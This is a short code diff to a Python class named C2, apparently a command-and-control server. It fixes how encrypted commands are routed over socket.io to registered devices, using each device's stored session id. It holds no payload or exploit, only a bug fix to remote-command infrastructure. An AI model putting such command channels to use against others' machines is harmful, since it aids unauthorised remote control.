@@ -177,7 +177,7 @@ class C2:
         if uid in self.devices:
             public_key_pem = self.devices[uid]["public_key"]
             encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
-            self.sio.emit("command", encrypted_data, to=sid)
+            self.sio.emit("command", encrypted_data, to=self.devices[uid]["sid"])
 
     def get_result(self, sid, data):
         for device in self.devices:
